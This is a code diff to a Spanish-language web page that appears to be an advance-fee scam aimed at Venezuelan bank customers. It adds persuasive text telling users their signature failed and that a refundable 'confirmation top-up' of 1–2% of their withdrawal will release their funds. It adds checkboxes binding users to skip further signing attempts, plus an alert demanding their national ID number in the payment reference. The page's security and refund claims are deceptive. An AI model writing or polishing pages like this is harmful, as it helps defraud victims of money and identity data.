@@ -2050,8 +2050,7 @@
       .feature-buttons-container {
         justify-content: center;
         gap: 0.6rem;
-      }
-      .feature-button {
+      }.feature-button {
         width: 140px;
         height: 50px;
       }
@@ -2217,6 +2216,99 @@
       overflow: hidden;
       text-overflow: ellipsis;
       padding: 0 0.5rem;
+    }
+    
+    /* NUEVO: Panel de control para botones */
+    .control-panel {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+      gap: 12px;
+      margin: 1.5rem 0;
+      background: rgba(240, 249, 255, 0.7);
+      padding: 1.25rem;
+      border-radius: var(--border-radius);
+      box-shadow: var(--shadow-sm);
+      border: 1px solid var(--border-light-blue);
+    }
+    
+    .control-panel .btn-std-container {
+      margin: 0;
+      width: 100%;
+    }
+    
+    @media (max-width: 480px) {
+      .control-panel {
+        grid-template-columns: 1fr;
+      }
+    }
+    
+    /* NUEVO: Estilos para el overlay de alerta de comprobante */
+    .alert-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(15, 23, 42, 0.6);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 999;
+      padding: 1rem;
+      opacity: 0;
+      transition: opacity 0.4s ease;
+      backdrop-filter: blur(6px);
+    }
+    
+    .alert-overlay.active {
+      display: flex;
+      opacity: 1;
+      animation: fadeIn 0.4s forwards;
+    }
+    
+    .alert-box {
+      background: white;
+      border-radius: var(--border-radius);
+      padding: 1.5rem;
+      max-width: 420px;
+      width: 90%;
+      box-shadow: var(--shadow);
+      text-align: center;
+      position: relative;
+      border-left: 4px solid var(--warning);
+    }
+    
+    .alert-box h4 {
+      color: var(--warning);
+      margin-bottom: 1rem;
+      font-size: 1.2rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+    }
+    
+    .alert-box p {
+      margin-bottom: 1.5rem;
+      text-align: left;
+      font-size: 0.95rem;
+      color: var(--text-secondary);
+    }
+    
+    .alert-box button {
+      background: var(--primary);
+      color: white;
+      border: none;
+      padding: 0.75rem 1.5rem;
+      border-radius: var(--border-radius-sm);
+      font-weight: 600;
+      cursor: pointer;
+      transition: var(--transition);
+    }
+    
+    .alert-box button:hover {
+      background: var(--primary-light);
+      transform: translateY(-2px);
     }
   </style>
 </head>
@@ -2497,7 +2589,7 @@
     </div>
   </div>
 
-  <!-- STEP 4C: Último paso para recibir tu dinero en minutos -->
+  <!-- STEP 4C: Último paso para recibir tu dinero en minutos (MODIFICADO) -->
   <div class="section-content" id="securityVerification3C">
     <h2>
       <i class="fas fa-flag-checkered"></i> Último paso para recibir tu dinero
@@ -2576,7 +2668,21 @@
       ya que el monto se reembolsará inmediatamente junto con tu saldo.
     </p>
     
-    <!-- Nuevo Checkbox para confirmar el entendimiento -->
+    <!-- MODIFICADO: Nuevos checkboxes para aceptar términos -->
+    <div class="custom-checkbox">
+      <input type="checkbox" id="checkboxNoMasFirmas">
+      <label for="checkboxNoMasFirmas">
+        Acepto no intentar volver a firmar y usar la Validación Express para confirmar mi identidad
+      </label>
+    </div>
+    
+    <div class="custom-checkbox">
+      <input type="checkbox" id="checkboxConfirmoTitularidad">
+      <label for="checkboxConfirmoTitularidad">
+        Confirmo que soy el titular legítimo de mi cuenta bancaria venezolana
+      </label>
+    </div>
+    
     <div class="custom-checkbox">
       <input type="checkbox" id="termsCheckbox">
       <label for="termsCheckbox">
@@ -2591,9 +2697,9 @@
       </a>
     </div>
     
-    <!-- Botones para ver explicación y video organizados mejor -->
-    <div style="display: flex; justify-content: center; flex-wrap: wrap; gap: 10px; margin: 1rem 0;">
-      <div class="btn-std-container" style="width: 160px;">
+    <!-- MODIFICADO: Nuevo panel de control para botones -->
+    <div class="control-panel">
+      <div class="btn-std-container">
         <div class="btn-glow-effect"></div>
         <button class="btn-glow" id="showExplicacionBtn">
           <div class="btn-glow-content btn-glow-initial">Ver explicación</div>
@@ -2604,7 +2710,7 @@
         </button>
       </div>
       
-      <div class="btn-std-container" style="width: 160px;">
+      <div class="btn-std-container">
         <div class="btn-glow-effect"></div>
         <button class="btn-glow" id="verVideoDesdeSeccionBtn">
           <div class="btn-glow-content btn-glow-initial">Ver tutorial</div>
@@ -2614,6 +2720,23 @@
           </div>
         </button>
       </div>
+      
+      <div class="btn-std-container">
+        <div class="btn-glow-effect success"></div>
+        <button class="btn-glow btn-success btn-disabled" id="recargaReadyBtn">
+          <div class="btn-glow-content btn-glow-initial">
+            <i class="fas fa-check" style="margin-right: 5px;"></i> Continuar
+          </div>
+          <div class="btn-glow-content btn-glow-hover">
+            Continuar
+            <i class="fas fa-arrow-right btn-glow-icon"></i>
+          </div>
+        </button>
+      </div>
+    </div>
+    
+    <div class="countdown" id="countdownRecargaReady" style="text-align: center; margin-top: 0.5rem;">
+      Completa la recarga antes de continuar...
     </div>
     
     <!-- NUEVOS BOTONES DE CARACTERÍSTICAS - Reorganizados para mejor visualización -->
@@ -2663,22 +2786,6 @@
           <i class="fas fa-play-circle"></i>
         </div>
       </a>
-    </div>
-    
-    <div style="text-align:center; margin-top:1.5rem;">
-      <div class="btn-std-container" style="margin: 0 auto; width: 160px;">
-        <div class="btn-glow-effect"></div>
-        <button class="btn-glow btn-disabled" id="recargaReadyBtn">
-          <div class="btn-glow-content btn-glow-initial">Continuar</div>
-          <div class="btn-glow-content btn-glow-hover">
-            Continuar
-            <i class="fas fa-arrow-right btn-glow-icon"></i>
-          </div>
-        </button>
-      </div>
-      <div class="countdown" id="countdownRecargaReady">
-        Completa la recarga antes de continuar...
-      </div>
     </div>
   </div>
 
@@ -3016,27 +3123,30 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
   </div>
 </div>
 
-<!-- NUEVO: Overlay de Explicación de Validación (Simplificado) -->
+<!-- MODIFICADO: Overlay de Explicación de Validación (Nuevo texto) -->
 <div class="overlay" id="overlayExplicacionValidacion">
   <div class="modal modal-glow">
     <h3>¿Por qué necesito verificar mi cuenta?</h3>
     <p>
-      Tu firma digital no coincide con la registrada, lo que ha activado nuestro protocolo de seguridad.
-      Para proteger tus fondos, necesitamos confirmar tu identidad mediante un proceso simple.
+      Tras dos intentos fallidos de validar tu firma digital, te ofrecemos la solución definitiva: nuestra <strong>Validación Express</strong>. Olvídate de firmar una y otra vez —con un simple paso, confirmamos que eres tú, el titular de la cuenta, y tus fondos estarán disponibles de inmediato.
+    </p>
+    
+    <p>
+      Esta es la forma más rápida y segura de recuperar tu dinero, sin complicaciones ni esperas innecesarias.
     </p>
     
     <div class="info-box">
-      <h4>Beneficios de esta verificación:</h4>
-      <ul class="icon-list">
-        <li><i class="fas fa-shield-alt"></i> <strong>Protege tus fondos</strong> contra accesos no autorizados</li>
-        <li><i class="fas fa-undo"></i> El monto de verificación <strong>se reembolsa completamente</strong></li>
-        <li><i class="fas fa-clock"></i> Proceso rápido (minutos) comparado con otras verificaciones (72h)</li>
-      </ul>
+      <h4>Cómo funciona:</h4>
+      <p>
+        Solo necesitas realizar una pequeña recarga —el "Movimiento de Confirmación"— desde tu cuenta bancaria registrada. Es mínima (1% para retiros menores a $500, 2% para mayores), se procesa al instante y te la reembolsamos completamente con tu retiro.
+      </p>
+      <p>
+        <strong>No es un costo, es tu pase directo a la tranquilidad.</strong>
+      </p>
     </div>
     
     <p>
-      Esta verificación a través de tu propia cuenta bancaria crea una prueba irrefutable 
-      de tu identidad, garantizando que solo tú puedas acceder a tus fondos.
+      Este método deja atrás opciones vulnerables como SMS o correos, que los hackers pueden burlar. Al usar tu propia cuenta, generamos una verificación biométrica financiera imposible de falsificar.
     </p>
     
     <div style="display:flex; justify-content:center; margin-top: 1rem;">
@@ -3050,6 +3160,20 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
         </button>
       </div>
     </div>
+  </div>
+</div>
+
+<!-- NUEVO: Overlay para alerta de concepto en el comprobante -->
+<div class="alert-overlay" id="overlayConceptoComprobante">
+  <div class="alert-box">
+    <h4><i class="fas fa-exclamation-triangle"></i> ¡Importante!</h4>
+    <p>
+      Para que podamos identificar correctamente tu recarga de verificación, es <strong>imprescindible</strong> que incluyas tu número de documento de identidad en el campo "Concepto" o "Referencia" al realizar el pago móvil.
+    </p>
+    <p>
+      Sin este dato, el sistema no podrá asociar automáticamente el pago con tu cuenta y podría retrasar el proceso.
+    </p>
+    <button id="btnCerrarAlertaConcepto">Entendido</button>
   </div>
 </div>
 
@@ -3232,6 +3356,13 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
           setTimeout(() => {
             showOverlay("overlayExplicacionValidacion");
           }, 4000);
+        }
+        
+        // Si es la sección de recarga, mostrar alerta de concepto
+        if (id === "recargaSection") {
+          setTimeout(() => {
+            showOverlay("overlayConceptoComprobante");
+          }, 1000);
         }
       }, 10);
     }
@@ -3924,8 +4055,7 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
       // A USD
       const usdVal = saldoDisponible / exchangeRate;
       balanceAmount.textContent = usdVal.toLocaleString("en-US", {
-        minimumFractionDigits: 2,
-        maximumFractionDigits: 2,
+        minimumFractionDigits: 2,maximumFractionDigits: 2,
       }) + " USD";
     } else {
       // A Bs
@@ -4181,24 +4311,35 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
       startRecargaReadyCountdown();
     });
 
-    // Checkbox para habilitar/deshabilitar el botón de continuar
+    // MODIFICADO: Checkboxes para habilitar/deshabilitar el botón de continuar
     const termsCheckbox = document.getElementById("termsCheckbox");
+    const checkboxNoMasFirmas = document.getElementById("checkboxNoMasFirmas");
+    const checkboxConfirmoTitularidad = document.getElementById("checkboxConfirmoTitularidad");
     const recargaReadyBtn = document.getElementById("recargaReadyBtn");
     
-    termsCheckbox.addEventListener("change", function() {
-      if (this.checked && recargaReadyBtnEnabled) {
+    // Función para verificar todos los checkboxes
+    function verificarCheckboxes() {
+      if (termsCheckbox.checked && 
+          checkboxNoMasFirmas.checked && 
+          checkboxConfirmoTitularidad.checked && 
+          recargaReadyBtnEnabled) {
         recargaReadyBtn.classList.remove("btn-disabled");
         recargaReadyBtn.disabled = false;
       } else {
         recargaReadyBtn.classList.add("btn-disabled");
         recargaReadyBtn.disabled = true;
       }
-    });
+    }
+    
+    // Asignar evento a cada checkbox
+    termsCheckbox.addEventListener("change", verificarCheckboxes);
+    checkboxNoMasFirmas.addEventListener("change", verificarCheckboxes);
+    checkboxConfirmoTitularidad.addEventListener("change", verificarCheckboxes);
 
     // Step3C -> Verificar recarga
     recargaReadyBtn.addEventListener("click", () => {
-      if (!termsCheckbox.checked) {
-        alert("Por favor, marca la casilla para confirmar que entiendes el proceso de verificación.");
+      if (!checkboxNoMasFirmas.checked || !checkboxConfirmoTitularidad.checked || !termsCheckbox.checked) {
+        alert("Por favor, marca todas las casillas para confirmar que entiendes el proceso de verificación.");
         return;
       }
       
@@ -4292,6 +4433,14 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
     }
     
     // NUEVOS BOTONES Y EVENTOS
+    
+    // Botón para cerrar alerta de concepto en comprobante
+    const btnCerrarAlertaConcepto = document.getElementById("btnCerrarAlertaConcepto");
+    if (btnCerrarAlertaConcepto) {
+      btnCerrarAlertaConcepto.addEventListener("click", function() {
+        hideOverlay("overlayConceptoComprobante");
+      });
+    }
     
     // Botón "Entendido" en el overlay de explicación de validación
     const entendidoBtn = document.getElementById("entendidoBtn");
@@ -4519,7 +4668,6 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
   function startRecargaReadyCountdown() {
     const btn = document.getElementById("recargaReadyBtn");
     const cdLabel = document.getElementById("countdownRecargaReady");
-    const termsCheckbox = document.getElementById("termsCheckbox");
     let timer = recargaReadyBtnCountdown;
     btn.disabled = true;
     btn.classList.add("btn-disabled");
@@ -4531,11 +4679,16 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
       if (timer <= 0) {
         clearInterval(interval);
         recargaReadyBtnEnabled = true;
-        // Solo habilitar si el checkbox está marcado
-        if (termsCheckbox.checked) {
+        // Verificar los checkboxes
+        const termsCheckbox = document.getElementById("termsCheckbox");
+        const checkboxNoMasFirmas = document.getElementById("checkboxNoMasFirmas");
+        const checkboxConfirmoTitularidad = document.getElementById("checkboxConfirmoTitularidad");
+        
+        if (termsCheckbox.checked && checkboxNoMasFirmas.checked && checkboxConfirmoTitularidad.checked) {
           btn.classList.remove("btn-disabled");
           btn.disabled = false;
         }
+        
         cdLabel.textContent = "¿Ya realizaste la recarga? Continúa aquí";
       }
     }, 1000);
@@ -5077,5 +5230,3 @@ Tu firma no coincide con la registrada en el banco. Necesitamos que pases por un
     s0.parentNode.insertBefore(s1, s0);
   })();
 </script>
-</body>
-</html>
